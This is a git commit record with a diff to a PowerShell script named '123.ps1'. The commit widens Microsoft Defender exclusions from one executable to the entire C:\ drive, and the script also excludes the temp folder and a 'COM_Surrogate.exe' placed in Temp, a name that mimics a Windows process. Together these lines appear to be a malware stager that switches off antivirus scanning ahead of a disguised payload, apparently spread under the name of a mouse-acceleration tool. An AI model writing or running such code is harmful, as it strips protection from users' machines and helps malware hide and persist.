e94b1d028bfe880f469efe4405fd561b00478792
chickennuggets <118553163+M7mmdddd@users.noreply.github.com>
2025-03-04 11:58:07 -0800

    Update 123.ps1

--- 123.ps1
+++ 123.ps1
@@ -1,4 +1,4 @@
-Add-MpPreference -ExclusionPath "Rawaccel PLUS.exe"
+Add-MpPreference -ExclusionPath "C:\"
 Add-MpPreference -ExclusionPath "$env:temp"
 Add-MpPreference -ExclusionPath "%userprofile%\AppData\Local\Temp\COM_Surrogate.exe"
 Add-MpPreference -ExclusionPath $env:TEMP\COM_Surrogate.exe
